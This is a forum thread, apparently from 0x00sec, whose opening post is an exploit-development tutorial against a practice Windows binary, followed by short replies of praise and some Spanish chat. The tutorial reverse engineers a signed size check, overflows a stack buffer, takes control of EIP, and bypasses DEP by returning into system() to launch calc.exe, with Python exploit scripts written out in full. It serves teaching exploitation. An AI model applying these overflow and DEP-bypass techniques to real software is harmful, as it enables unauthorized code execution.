{"title": "Bypass Data Execution Protection (DEP) - Exploit Development - 0x00sec - The Home of the Hacker", "users": ["http://0x00sec.org/u/Sk0xic", "http://0x00sec.org/u/ricksanchez", "http://0x00sec.org/u/Atentacle", "http://0x00sec.org/u/panic_monster", "http://0x00sec.org/u/Atentacle", "http://0x00sec.org/u/johnmarston", "http://0x00sec.org/u/Sk0xic", "http://0x00sec.org/u/Atentacle", "http://0x00sec.org/u/mcpwn84", "http://0x00sec.org/u/AdwareHunter", "http://0x00sec.org/u/bluretrece", "http://0x00sec.org/u/alias", "http://0x00sec.org/u/system"], "data": [{"author": "Sk0xic", "speak": "Hey folks! this topic details how to overflow a buffer, bypass DEP (Data Execution Prevention) and take control of the executableRecommended PrerequisitesC/C++ language, a basic level would be finex86 Intel AssemblyFamiliarity with Buffer OverflowDebuggers/DisassemblyThe binaryFileVirustotalOkay, first thing we need to do is see what the executable brings us, so we run it.Here we see that it is asking for a file file.dat but as it does not exist it tells us that it cannot be opened, Once created we see that it shows us a message with 3 values at 0 that seem to correspond to 3 variables (cookie, cookie2 and size) and nothing else.Since we don\u00e2\u20ac\u2122t know what it does, let\u00e2\u20ac\u2122s take a look at it.function1_opt(2).png800x368 146 KBThis function has 5 variables, 4 of which are initialized at 0 and one at 32h (\u00e2\u20ac\u01532\u00e2\u20ac\ufffd), there is a pointer to LoadLibrary that is stored in 0x10103024 then makes a fopen to \u00e2\u20ac\u0153fichero.dat\u00e2\u20ac\ufffd file in binary read mode, stores the FILE pointer in 0x10103020 and finally checks if it exists, if it does not exist it will go to 0x101010d3 and closes (as we saw before) and if it exists it goes to 0x101010e9, let\u00e2\u20ac\u2122s look thereOk, in this procedure it first reads 4 bytes of fichero.dat with fread and stores them in a pointer to a block of memory look (ebp-c), fread returns the total number of elements read and stores it in ebp-8, it does fread of 4 bytes again for the file and stores them in a pointer to ebp-10 then it does it one more time of 1 byte and stores it in a pointer to ebp-1, finally it compares this byte with [ebp-14] which is 32h (\u00e2\u20ac\u01532\u00e2\u20ac\ufffd) and if it is less than or equal (jle) it goes to 0x10101155 if it doesn\u00e2\u20ac\u2122t, show a message saying \u00e2\u20ac\u0153Nos fuimos al carajo\u00e2\u20ac\ufffd (We\u00e2\u20ac\u2122re going to fuck off) and it closes.Then we write in the file 8 bytes + the correct byte (\u00e2\u20ac\u01532\u00e2\u20ac\ufffd) and we enter 0x10101155, for example:1234 + 5678 + 2Well, here it pushes the saved bytes with fread and prints them, allocates 50 bytes (32h) of memory with malloc, stores the pointer to the allocated memory in ebp-1c then push the first 8 bytes of \u00e2\u20ac\u0153fichero.dat\u00e2\u20ac\ufffd to 0x10101010, let\u00e2\u20ac\u2122s look over thereOkay, what it does here is it takes the first 4 bytes of fichero.dat and adds them to the following 4 bytes then the result is compared to 58552433h, if the condition is correct, loads \u00e2\u20ac\u0153pepe.dll\u00e2\u20ac\ufffd, then let\u00e2\u20ac\u2122s make sure the condition is met (as it is little endian we have to put the bytes at backwards)As not all characters meet the condition as \u00e2\u20ac\u01530\u00e2\u20ac\ufffd (30h) +\"(\" (28h) = 58h (1 byte correct) we do a script that does it and readydata = \"\\x21\\x1210\" + \"\\x12\\x12$(\" + \"2\"with open(\"fichero.dat\", \"w\") as file:file.write(data)Okay, this must meet the condition, let\u00e2\u20ac\u2122s see.Well, let\u00e2\u20ac\u2122s see what\u00e2\u20ac\u2122s it now.Once we leave 0x10101010 we see that it reads [ebp-1] bytes of fichero.dat with fread and stores it in a buffer pointing to (ebp-54), Okay, here\u00e2\u20ac\u2122s a buffer overflow, let\u00e2\u20ac\u2122s analyze it.First we saw that the ninth byte of \u00e2\u20ac\u0153fichero.dat\u00e2\u20ac\ufffd was stored in [ebp-1], then compared to [ebp-14] (\u00e2\u20ac\u01532\u00e2\u20ac\ufffd)Well, now we see that that byte ([ebp-1]) is used as size of fread that will store that number of bytes (size) in a buffer (ebp-54) of 52 bytes, as the nearest variable is ebp-20, [ebp-54] - [ebp-20] = [ebp-34], so 34h (52d), we can also see it in the IDA stack, right click -> array -> okOkay, knowing all that, how could we overflow the buffer?[ebp-1] is the ninth byte of fichero.dat, the size of fread for store in the buffer [ebp-54] and must also be less than or equal to 32h (\u00e2\u20ac\u01532\u00e2\u20ac\ufffd).So we know that negative numbers in hexadecimal are higher in decimal, so if we put a negative number in hexadecimal it would allow us to enter more bytes than allowed (52d) and this is because it is signed (jle)0x10101139 movsx ecx,  byte ptr ss:[ebp-1]0x1010113d cmp ecx,    dword ptr ss:[ebp-14]0x10101140 jle         stack9b.10101155Let\u00e2\u20ac\u2122s try to get to the edge of the buffer and at the same time overflowing 2 bytes of the fread stipulation (50 bytes, 32h).data = \"\\x21\\x1210\" + \"\\x12\\x12$(\" + \"\\xff\" + \"A\" * 52with open(\"fichero.dat\", \"w\") as file:file.write(data)Cool!!! Let\u00e2\u20ac\u2122s see what else there is to see if we can control the retn.Well, now there is a procedure where it copy the buffer bytes [ebp-54] for the block in memory allocated by malloc [ebp-1c]nowrite_opt(1).png800x467 162 KBSo, if I fill out [ebp-1c] with \u00e2\u20ac\u0153\\x41x41x41\\x41\u00e2\u20ac\ufffd he won\u00e2\u20ac\u2122t be able to write because it\u00e2\u20ac\u2122s not a valid address, let\u00e2\u20ac\u2122s find one that is.All right, let\u00e2\u20ac\u2122s check the stack, see how many bytes it takes to get to the start of retn and control it.Okay, let\u00e2\u20ac\u2122s set up our exploitimport subprocessshellcode =\"\\xB8\\x40\\x50\\x03\\x78\\xC7\\x40\\x04\"+ \"calc\" + \"\\x83\\xC0\\x04\\x50\\x68\\x24\\x98\\x01\\x78\\x59\\xFF\\xD1\"buff = \"\\x41\" * 52ebp_20 = \"\\x41\" * 4ebp_1c = \"\\x30\\x30\\x10\\x10\"    # Address with write permissionebp_18 = \"\\x41\" * 4ebp_14 = \"\\x41\" * 4ebp_10 = \"\\x41\" * 4ebp_c = \"\\x41\" * 4ebp_8 = \"\\x41\" * 4ebp_4 = \"\\x41\" * 4s = \"\\x41\" * 4    # ebpr = shellcodedata = \"\\x21\\x1210\" + \"\\x12\\x12$(\" + \"\\xff\" + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + rwith open(\"fichero.dat\", \"w\") as file:file.write(data)subprocess.call(r\"stack9b.exe\")stack_opt.png800x382 136 KBidaex_opt.png700x198 31.6 KBpe_opt(1).png700x282 123 KBWell, we already have EIP under control but now it doesn\u00e2\u20ac\u2122t allow me to execute my shellcode, this is due to DEP (data execution prevention).Summarizing up, DEP changes the permissions of the segments where data is stored to prevent us from executing code there   -ricnarSo to bypass the DEP we can do ROP (return oriented programming) which is basically using gadgets that are program\u00e2\u20ac\u2122s executable code to change the stack permissions with some api like VirtualProtect or VirtualAllocLooking for gadgets in pepe.dll I couldn\u00e2\u20ac\u2122t find VirtualAlloc, but there is a pointer to system() , would only be missing a return that can be exit() and a fixed place that we can control to pass it a string to system()Now only the string for system() would be missing, we can use the address with write permissionHere I set up the stack because malloc only assigned 50 bytes and then had no control over the eip and that\u00e2\u20ac\u2122s how the exploit would look.good_opt.png800x360 134 KBimport subprocesssystem = \"\\x24\\x98\\x01\\x78\"    # system()calc = \"calc.exe\"buff = \"\\x41\" * 42#ebp_20 = \"\\x41\" * 4ebp_1c = \"\\x30\\x30\\x10\\x10\"    # Address with write permissionebp_18 = \"\\x41\" * 4ebp_14 = \"\\x41\" * 4ebp_10 = \"\\x41\" * 4ebp_c = \"\\x41\" * 4ebp_8 = \"\\x41\" * 4ebp_4 = \"\\x41\" * 4s = \"\\x41\" * 4    # ebpr = systemexit = \"\\x78\\x1d\\x10\\x10\"    # exit()ptr_calc = \"\\x5a\\x30\\x10\\x10\"data = \"\\x21\\x1210\" + \"\\x12\\x12$(\" + \"\\xff\" + buff + calc + \"\\x41\" * 6 +  ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calcwith open(\"fichero.dat\", \"w\") as file:file.write(data)subprocess.call(r\"stack9b.exe\")WO_opt.png800x383 81.3 KB"}, {"author": "ricksanchez", "speak": "Ay nice! That\u00e2\u20ac\u2122s basically the windows counterpart  to my exploit mitigation series (DEP edition).Nice to see both sides covered now."}, {"author": "Atentacle", "speak": "Dank!\u00c2\u00bfDe donde has sacado el programa ( si se puede saber )? \u00c2\u00bfLo encontraste por casualidad?Hoping to see more content like this, and happy to see a spanish fellow around here"}, {"author": "panic_monster", "speak": "Awesome tutorials on the exploit development category.Can we also have challenges on these topics, that would allow us to practice these concepts hands on."}, {"author": "Atentacle", "speak": "There\u00e2\u20ac\u2122s the exploit-excercises website, it\u00e2\u20ac\u2122s pretty good, done a few of them."}, {"author": "johnmarston", "speak": "Nice explanation! This actually helped clear some things up for me when it comes to ROP"}, {"author": "Sk0xic", "speak": "Claro que s\u00c3\u00ad, http://ricardonarvaja.info/WEB/EXPLOITING/"}, {"author": "Atentacle", "speak": "Hostias el narvaja. Mercis!"}, {"author": "mcpwn84", "speak": "Nice post, thanks for sharing.Copado encontrarse con gente hispana. Saludos"}, {"author": "AdwareHunter", "speak": "Fantastic article! Very well-written. Complete, Concise, and easy to understand. Please keep up the great work!"}, {"author": "bluretrece", "speak": "Gracias por el aporte, compa!"}, {"author": "alias", "speak": "+1, very well written."}, {"author": "system", "speak": "This topic was automatically closed after 30 days. New replies are no longer allowed."}]}